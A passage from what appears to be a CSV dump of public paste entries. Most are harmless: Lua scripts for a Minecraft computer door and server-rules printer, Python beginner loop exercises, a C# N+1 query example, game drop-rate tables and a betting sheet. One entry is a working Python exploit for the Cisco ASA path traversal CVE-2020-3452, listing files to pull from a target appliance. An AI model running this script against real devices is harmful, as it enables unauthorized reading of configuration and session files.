id,title,username,language,date,content
    ""leadershipPrice"": 13,
    ""nameRu"": ""Степные гоблины""
  },
  {
    ""attack"": 4,
    ""shots"": null,
    ""defense"": 3,
    ""mana"": null,
    ""damage"": ""1-3"",
    ""damageMin"": 1,
    ""damageMax"": 3,
    ""range"": null,
    ""hp"": 5,
    ""initiative"": 11,
    ""speed"": 4,
    ""leadershipPrice"": 31,
    ""nameRu"": ""Троглодиты""
  }
]"
aWAgm0AP,door.lua,Izeek182,Lua,Sunday 30th of July 2023 05:23:34 AM CDT,"local password = ""forScience"" -- Change bacon to what you want your password to be. Be sure to leave the ""s around it, though
local pullEvent = os.pullEvent
os.pullEvent = os.pullEventRaw

local attempts = 0

local m = peripheral.wrap(""top"")
local w = peripheral.wrap(""back"")

local function _clear()
    term.clear() -- Clears the screen
    m.clear()
end

local function _write(text)
    term.write(text) -- Fixes the cursor position
    m.write(text) -- Fixes the cursor position
    
end

local function _setCursorPos(x,y)
    term.setCursorPos(x,y)
    m.setCursorPos(x,y)
end

local function _openDoor()
    w.transmit(3,3,""open"")
end

local function _closeDoor()
    w.transmit(3,3,""close"")    
end

local function _triggerTrap()
    w.transmit(3,3,""trap"")
end

while true do
    _clear()
    _setCursorPos(1,1) 
    _write(""Please Enter The Passcode:"")
    _setCursorPos(1,2) 
    _write(""Hint: What its all for"")
    _setCursorPos(1,3)
    _write(""   :"")
    local input = read(""*"") -- Makes the variable 'input' have the contents of what the user types in, the ""*"" part censors out the password
    if input == password then
        _clear()
        _setCursorPos(1,1) 
        _write(""Password Correct"")
        _setCursorPos(1,2) 
        _write(""Welcome home professor"")
        _openDoor()
        attempts = 0
        os.pullEvent = pullEvent
        sleep(3)
        pullEvent = os.pullEvent
        os.pullEvent = os.pullEventRaw
        _closeDoor()
    else
        _clear()
        _setCursorPos(1,1) 
        _write(""Password Incorrect!"")
        _setCursorPos(1,2) 
        if attempts == 0 then
            _write(""try again professor"")
        elseif attempts == 1 then
            _write(""Is that you professor?"")
        elseif attempts == 2 then
            _write(""Are you sure you should"")
            _setCursorPos(1,3) 
            _write(""   be here?"")
        elseif attempts >= 3 then
            _write(""You are not the professor"")
            _setCursorPos(1,3) 
            _write(""Prepare to die"")
            _triggerTrap()
            sleep(10)
        end
        attempts = attempts + 1
        sleep(2)

    end
end"
mcGc5R47,N+1 problem example,ivandrofly,C#,Sunday 30th of July 2023 05:16:18 AM CDT,"// Example of N+1 problem
var orders = context.Orders.ToList();
foreach(var order in orders)
{
   var customer = context.Customers.Find(order.CustomerId);
   Console.WriteLine($""Order {order.Id} belongs to {customer.Name}"");
}

// Avoiding N+1 problem by eager loading
var orders = context.Orders.Include(o => o.Customer).ToList();
foreach(var order in orders)
{
   var customer = order.Customer;
   Console.WriteLine($""Order {order.Id} belongs to {customer.Name}"");
}"
28zFGusD,Untitled,Glenpl,C++,Sunday 30th of July 2023 05:02:42 AM CDT,"godzina: 13:00
wpłata, stawka: 100 zł
kod bonusowy: bonus2

---

A: GKS Katowice - Ch.Głogów (1 - 02)
A: Royal Antwerp FC - Cercle Brugge (1 - 02)
B: Falkowska W. / Piter K. - Watson H. / Wickmayer Y (Mecz: suma gemów parz/niep)
C: Zverev A. - Djere L. (Mecz: suma gemów parz/niep)

Andrzej1	A1 B1 C1
Andrzej2	A1 B1 C2
Andrzej3	A1 B2 C1
Jacek	A1 B2 C2 
Jakub1	A2 B1 C1
Jakub2	A2 B1 C2
Stachu	A2 B2 C1
Remik	A2 B2 C2"
PZsm6HLh,06. Max Number,veronikaaa86,Python,Sunday 30th of July 2023 04:56:07 AM CDT,"import sys

input_line = input()

max_num = -sys.maxsize
while input_line != ""Stop"":
    current_num = int(input_line)

    if current_num > max_num:
        max_num = current_num

    input_line = input()

print(max_num)"
TP9mUgXZ,07. Moving,veronikaaa86,Python,Sunday 30th of July 2023 04:44:16 AM CDT,"width = int(input())
length = int(input())
height = int(input())

volume = width * length * height

sum_boxes = 0
input_line = input()
while input_line != ""Done"":
    current_boxes = int(input_line)
    sum_boxes += current_boxes

    if sum_boxes >= volume:
        break

    input_line = input()

diff = abs(sum_boxes - volume)
if sum_boxes >= volume:
    print(f""No more free space! You need {diff} Cubic meters more."")
else:
    print(f""{diff} Cubic meters left."")"
G3HUL1ez,05. Coins,veronikaaa86,Python,Sunday 30th of July 2023 04:10:25 AM CDT,"change = float(input())
coins_change = change * 100

count = 0
while coins_change > 0:
    if coins_change >= 200:
        coins_change -= 200
    elif coins_change >= 100:
        coins_change -= 100
    elif coins_change >= 50:
        coins_change -= 50
    elif coins_change >= 20:
        coins_change -= 20
    elif coins_change >= 10:
        coins_change -= 10
    elif coins_change >= 5:
        coins_change -= 5
    elif coins_change >= 2:
        coins_change -= 2
    elif coins_change >= 1:
        coins_change -= 1
    else:
        break

    count = count + 1

print(count)"
2sj2aECu,[ AWS TOOLS ] Debunked Arm Wrestle Simulator Odds/chances and more,Shifu_,Lua,Sunday 30th of July 2023 04:09:31 AM CDT,"█▀▀ █▀█ █▀▀ █▀▄ █ ▀█▀ █▀
█▄▄ █▀▄ ██▄ █▄▀ █ ░█░ ▄█

-- // Debunked by HyperSpeed#7040
-- // Place Version  - 924
-- // https://pastebin.com/raw/2sj2aECu ALWAYS UPDATED!

█▀▀ █▀█ ▄▀█ ▀█▀ █▀▀ █▀
█▄▄ █▀▄ █▀█ ░█░ ██▄ ▄█

-- // Diamond Crate
BuffPrimal    =    60%         520x       1/1.67        LEGENDARY
BuffToxic     =    20%         540x       1/5           LEGENDARY
BuffAlien     =    15%         570x       1/6.67        LEGENDARY
BuffMoon      =    5%          600x       1/20          MYTHIC
BuffCrab      =    2.5%        620x       1/40          MYTHIC
BuffSeaweed   =    0.075%      700x       1/1,333       MYTHIC
BuffCacti     =    0.05%       650x       1/2,000       MYTHIC
BuffVenom     =    0.01%       750x       1/10,000      MYTHIC
BuffGorilla   =    0.005%      900x       1/20,000      OMEGA

-- // Gold Crate
BuffVoid      =    60%         250x       1/1.67        RARE 
BuffCrystal   =    20%         275x       1/5           RARE
BuffBling     =    5%          420x       1/20          EPIC
BuffFrozen    =    2.5%        350x       1/40          EPIC
BuffFlame     =    1.5%        375x       1/66.67       EPIC
BuffBio       =    0.5%        420x       1/200         EPIC
BuffRotten    =    0.1%        445x       1/1,000       EPIC
BuffOvergrown =    0.05%       470x       1/2,000       EPIC
BuffSandy     =    0.025%      500x       1/4,000       LEGENDARY
BuffTiger     =    0.01%       500x       1/10,000      LEGENDARY

-- // Silver Crate
Mummy         =    50%         50x        1/2           UNCOMMON
Rotten        =    20%         55x        1/5           UNCOMMON
Magnetic      =    15%         60x        1/6.67        UNCOMMON
Seaweed       =    10%         75x        1/10          UNCOMMON
Frozen        =    5%          88x        1/20          UNCOMMON
Flame         =    2.5%        95x        1/40          UNCOMMON
Toxic         =    1.5%       115x        1/66.7        UNCOMMON
BuffRipped    =    1%         170x        1/100         RARE
BuffBulk      =    0.5%       200x        1/200         RARE
BuffSteampunk =    0.25%      250x        1/400         RARE

-- // Rust Crate
Zombie        =    60%        5x          1/1.67        COMMON
Bionic        =    30%        8x          1/1.33        COMMON
Candy         =    20%        12x         1/5           COMMON
Rainbow       =    15%        17x         1/6.67        COMMON
Crystal       =    10%        20x         1/10          UNCOMMON
Bone          =    5%         20x         1/20          UNCOMMON
Hobo          =    3%         30x         1/33.33       UNCOMMON
Floral        =    2%         30x         1/50          UNCOMMON
Void          =    1%         35x         1/100         UCOMMON
Cacti         =    0.5%       40x         1/200         UNCOMMON

█▄▀ █▀▀ █▄█ █▀
█░█ ██▄ ░█░ ▄█

-- // Key odds [ NOT ACCURITE 100%, TRUST ONLY THE MIDDLE NUMBERS ]
[ Deafult ]
RustKey       =    5.10%       5          1/19.61
SilverKey     =    1.02%       1          1/98.04
Nothing       =    93.88%      92         1/1.06
[ World 1 ]
RustKey       =    9.52%       10         1/10.50
SilverKey     =    2.85%       3          1/35.09
GoldKey       =    0.048%      0.05       1/2083.33
Nothing       =    87.62%      92         1/1.14
[ World 2 ]
RustKey       =    11.76%      13         1/8.50
SilverKey     =    4.52%       5          1/22.12
GoldKey       =    2.26%       2.5        1/44.25
Nothing       =    81.41%      90         1/1.23
[ World 3 ]
RustKey       =    15.58%      17         1/6.42
SilverKey     =    6.42%       7          1/15.58
GoldKey       =    4.58%       5          1/21.83
DiamondKey    =    0.046%      0.05       1/2173.91
Nothing       =    73.36%      80         1/1.36
[ World 4 ]
RustKey       =    15.38%      20         1/6.50
SilverKey     =    11.53%      15         1/8.67
GoldKey       =    7.69%       10         1/13.00
DiamondKey    =    0.038%      0.05       1/2631.58
Nothing       =    65.36%      85         1/1.53
[ World 5 ]
RustKey       =    17.40%      20         1/5.75
SilverKey     =    8.69%       10         1/11.52
GoldKey       =    2.40%       3          1/41.67
DiamondKey    =    0.04%       0.05       1/2500
Nothing       =    60.83%      85         1/1.64

█▀▀ █▀▀ █▀▀ █▀
██▄ █▄█ █▄█ ▄█

-- // Eggs
[ Season 1 Egg ]
DoodleCroc    =    63%                    1/1.59
ToxicParrot   =    31%                    1/3.23
ElephantHydra =    5%                     1/20
TechnoSphinx  =    0.5%                   1/200
ToxicWyvern   =    0.05%                  1/2000
-- // Want to request an egg? Any egg??? Hit me up
-- // HyperSpeed#7040

█▀▄▀█ ▄▀█ █▀▀ █░█ █ █▄░█ █▀▀ █▀
█░▀░█ █▀█ █▄▄ █▀█ █ █░▀█ ██▄ ▄█

-- // Machine Multiplier
Normal        =    1x
Golden        =    1.5x
Void          =    2x


█▀▄▀█ █ █▀ █▀▀
█░▀░█ █ ▄█ █▄▄

-- // Best Ways To Farm
World 1       =    Anything (knuckles mostly though)
World 2       =    Knuckles
World 3       =    Grip / Knuckles if VIP
World 4       =    Barbell/Biceps

-- // Small Details
MaxTradeablePets = 100
MaxEquipedPets = 32
"
er6vh7yJ,04. Walking,veronikaaa86,Python,Sunday 30th of July 2023 03:50:00 AM CDT,"sum_steps = 0
goal_steps = 10000
input_line = input()
while input_line != ""Going home"":
    steps = int(input_line)
    sum_steps += steps

    if sum_steps >= goal_steps:
        break

    input_line = input()

if input_line == ""Going home"":
    steps_home = int(input())
    sum_steps += steps_home

diff = abs(goal_steps - sum_steps)
if sum_steps >= goal_steps:
    print(""Goal reached! Good job!"")
    print(f""{diff} steps over the goal!"")
else:
    print(f""{diff} more steps to reach goal."")"
64CNUVxv,03. Vacation,veronikaaa86,Python,Sunday 30th of July 2023 03:36:38 AM CDT,"needed_money = float(input())
init_money = float(input())

count_spend_days = 0
count_total_days = 0
total_sum = init_money
while total_sum < needed_money:
    if count_spend_days == 5:
        break

    action = input()
    amount = float(input())

    count_total_days += 1

    if action == ""spend"":
        count_spend_days += 1
        total_sum = total_sum - amount
        if total_sum < 0:
            total_sum = 0
    else:
        count_spend_days = 0
        total_sum = total_sum + amount

if count_spend_days == 5:
    print(""You can't save the money."")
    print(count_total_days)
else:
    print(f""You saved the money for {count_total_days} days."")"
iPjpSfj6,02. Exam Preparation,veronikaaa86,Python,Sunday 30th of July 2023 02:58:05 AM CDT,"number_poor_grades = int(input())

flag = False
count_poor = 0
sum_grades = 0
count_grades = 0
last_problem = """"
input_line = input()
while input_line != ""Enough"":
    current_grade = int(input())
    if current_grade <= 4:
        count_poor += 1

    if count_poor == number_poor_grades:
        flag = True
        break

    count_grades = count_grades + 1
    sum_grades = sum_grades + current_grade
    last_problem = input_line

    input_line = input()

if flag:
    print(f""You need a break, {count_poor} poor grades."")
else:
    avg_grade = sum_grades / count_grades
    print(f""Average score: {avg_grade:.2f}"")
    print(f""Number of problems: {count_grades}"")
    print(f""Last problem: {last_problem}"")"
YEkXScHd,Page 4,MagmaLP,Lua,Sunday 30th of July 2023 02:50:47 AM CDT,"local printer = peripheral.wrap(""bottom"")
 
function msg(gap, line, text) 
    printer.setCursorPos(gap,line)
    text = printer.write(text)
end 
 
if printer.newPage() then
	msg(01,02,""Griefing:"")
    msg(01,03,""~~~~~~~~~"")
    msg(01,04,""Griefing of any kind is  "")
    msg(01,05,""strictly prohibited.     "")
    msg(01,06,""Bypassing or overcoming  "")
    msg(01,07,""the security mechanics of"")
    msg(01,08,""any kind and destroying  "")
    msg(01,09,""the property of a user is"")
    msg(01,10,""also strictly prohibited "")
	msg(01,11,""and will be punished very"")
	msg(01,12,""hard."")
	msg(01,13,"" "")
	msg(01,14,""No landscape destructive "")
	msg(01,15,""in the mainworld.        "")
	msg(01,16,""(1x1 towers ect.) "")
	msg(01,17,""Mining in the mainworld  "")
	msg(01,18,""(ores, spawner, wood...) "")
	msg(01,19,""is forbidden use /farm or"")
	msg(01,20,""/quarry."")
    msg(19,21,""Page  4"")
    printer.setPageTitle(""Page 4"")
    printer.endPage()
else
    error(""Page could not be created."")
end"
nqHJhN5E,CVE-2020-3452.py - Cisco ASA Path Traversal,FlyFar,Python,Sunday 30th of July 2023 02:39:51 AM CDT,"import os
import requests

# Written by freakyclown for @CygentaHQ
# Cisco ASA Path Traversal
# CVE-2020-3452
# Usage: CVE-2020-3452.py {target}""
# Example: CVE-2020-3452.py 192.168.0.12""
# Requires - Requests - pip3 install requests
#
# This tool takes advantage of the above cve and attempts to
# download files as listed below, it is suggested that you make
# a working folder for the outputfiles to avoid confusion if
# attacking mutliple ASA's

# set your target
target = input(""Enter target IP/Url: "")


def grabstuff():
    for file in files:
        print(""trying: "", file)

        #set request parameters
        params = (
            ('type', 'mst'),
            ('textdomain', file),
            ('default-language', ''),
            ('lang', '../'),
        )

        # set the response to the result of the request, inputting in target and params and ignoring ssl cert problems
        response = requests.get('https://'+target+'/+CSCOT+/translation-table', params=params, verify=False)
        # write the file to the disk
        directory = os.path.dirname(file)
        if not os.path.exists(directory):
            os.makedirs(directory)
        f = open(file,""w"")
        f.write(response.text) 
        f.close()



# this is a list of files available to download, more will be added in time
# if anyone has a list of ASA files, I'd be happy to add here
files = {
""+CSCOCA+/ca_inc.lua"",
""+CSCOCA+/crl/asa_ca.crl"",
""+CSCOCA+/enroll.html"",
""+CSCOCA+/login.html"",
""+CSCOE+/041235123432C2"",
""+CSCOE+/041235123432U2"",
""+CSCOE+/app_index.html"",
""+CSCOE+/appstart.js"",
""+CSCOE+/appstatus"",
""+CSCOE+/ask.html"",
""+CSCOE+/auth.html"",
""+CSCOE+/autosignon_api.js"",
""+CSCOE+/blank.html"",
""+CSCOE+/cedf.html"",
""+CSCOE+/cedhelp.html"",
""+CSCOE+/ced.html"",
""+CSCOE+/cedlogon.html"",
""+CSCOE+/cedmain.html"",
""+CSCOE+/cedportal.html"",
""+CSCOE+/cedsave.html"",
""+CSCOE+/cert.html"",
""+CSCOE+/color_picker.html"",
""+CSCOE+/color_picker.js"",
""+CSCOE+/common.js"",
""+CSCOE+/commonspawn.js"",
""+CSCOE+/display_bookmarks.lua"",
""+CSCOE+/files/browse.html"",
""+CSCOE+/files/domains_retr"",
""+CSCOE+/files/file_action.html"",
""+CSCOE+/files/files.js"",
""+CSCOE+/files/files_retr"",
""+CSCOE+/files/webfolder"",
""+CSCOE+/files/wfolder"",
""+CSCOE+/gp-gip.html"",
""+CSCOE+/handler"",
""+CSCOE+/help/webvpn_help"",
""+CSCOE+/home/index.html"",
""+CSCOE+/http_auth.html"",
""+CSCOE+/include/browser_inc.lua"",
""+CSCOE+/include/common.lua"",
""+CSCOE+/include/plugin.lua"",
""+CSCOE+/lced.html"",
""+CSCOE+/load_bookmarks.lua"",
""+CSCOE+/localization_inc.lua"",
""+CSCOE+/logo.gif"",
""+CSCOE+/logon_custom.css"",
""+CSCOE+/logon_forms.js"",
""+CSCOE+/logon.html""
""+CSCOE+/logon.html"",
""+CSCOE+/logon_redirect.html"",
""+CSCOE+/logout.html"",
""+CSCOE+/message.html"",
""+CSCOE+/noportal.html"",
""+CSCOE+/nostcaccess.html"",
""+CSCOE+/no_svc.html"",
""+CSCOE+/ping.html"",
""+CSCOE+/pluginlib.js"",
""+CSCOE+/portal_ce.html"",
""+CSCOE+/portal.css"",
""+CSCOE+/portal_custom.css"",
""+CSCOE+/portal_elements.html"",
""+CSCOE+/portal_forms.js"",
""+CSCOE+/portal.html"",
""+CSCOE+/portal_inc.lua"",
""+CSCOE+/portal.js"",
""+CSCOE+/posturl.html"",
""+CSCOE+/preview.html"",
""+CSCOE+/relayjar.html"",
""+CSCOE+/relaymonjar.html"",
""+CSCOE+/relaymonocx.html"",
""+CSCOE+/relayocx.html"",
""+CSCOE+/running.conf"",
""+CSCOE+/saml/sp/acs"",
""+CSCOE+/saml/sp/login"",
""+CSCOE+/saml/sp/metadata"",
""+CSCOE+/save_capture.html"",
""+CSCOE+/sdesktop/fail.html"",
""+CSCOE+/sdesktop/logout.html"",
""+CSCOE+/sdesktop/scan.xml"",
""+CSCOE+/sdesktop/tokenrenew.xml"",
""+CSCOE+/sdesktop/token.xml"",
""+CSCOE+/sdesktop/wait.html"",
""+CSCOE+/sdesktop/webstart.xml"",
""+CSCOE+/session.js"",
""+CSCOE+/session_password.html"",
""+CSCOE+/sess_update.html"",
""+CSCOE+/shshim"",
""+CSCOE+/shshimdo_url"",
""+CSCOE+/smart_tunnel_install.html"",
""+CSCOE+/st_dl.json"",
""+CSCOE+/svc.html"",
""+CSCOE+/tlbr"",
""+CSCOE+/tlbrportal_forms.js"",
""+CSCOE+/tunnel_linux.jnlp"",
""+CSCOE+/tunnel_mac.html"",
""+CSCOE+/tunnel_mac.jnlp"",
""+CSCOE+/useralert.html"",
""+CSCOE+/user_dialog.html"",
""+CSCOE+/win.js"",
""+CSCOE+/wrong_url.html"",
""+CSCOL+/cte_fallback.js"",
""+CSCOL+/cte.js"",
""+CSCOL+/relayparam.js"",
""+CSCOL+/sw.js"",
""+CSCOL+/xsl.js"",
""CSCOSSLC/config-auth"",
""+CSCOT+/oem-customization"",
""+CSCOT+/translation"",
""+CSCOT+/translation-table"",
""+CSCOU+/anyconnect_unsupported_version.html"",
""+CSCOU+/anyconnect_wrong_url.html"",
""+CSCOU+/portal.css"",
""+CSCOU+/sample.html"",
""locale/manifest_data.lua""
}


# Trying....
try:
    grabstuff()
except Exception as err:
    print(""Something went wrong, sorry"")
    print(err)

"
hHTZbjT7,Page 3,MagmaLP,Lua,Sunday 30th of July 2023 02:34:08 AM CDT,"local printer = peripheral.wrap(""bottom"")
 
function msg(gap, line, text) 
    printer.setCursorPos(gap,line)
    text = printer.write(text)
end 
 
if printer.newPage() then
	msg(01,02,""Chat rules:"")
    msg(01,03,""~~~~~~~~~~~"")
    msg(01,05,""No Spam, no caps,no      "")
    msg(01,06,""advertisement of any kind"")
    msg(01,07,""and no begging for ranks,"")
    msg(01,08,""items, sun, day or"")
    msg(01,09,""anything else."")
    msg(19,21,""Page  3"")

    printer.setPageTitle(""Page 3"")
    printer.endPage()
else
    error(""Page could not be created."")
end"
8U9rqH14,01. Old Books,veronikaaa86,Python,Sunday 30th of July 2023 02:28:32 AM CDT,"book = input()

count = 0
is_found = False
input_line = input()
while input_line != ""No More Books"":
    if input_line == book:
        is_found = True
        break

    count = count + 1
    input_line = input()

if is_found:
    print(f""You checked {count} books and found it."")
else:
    print(""The book you search is not here!"")
    print(f""You checked {count} books."")"
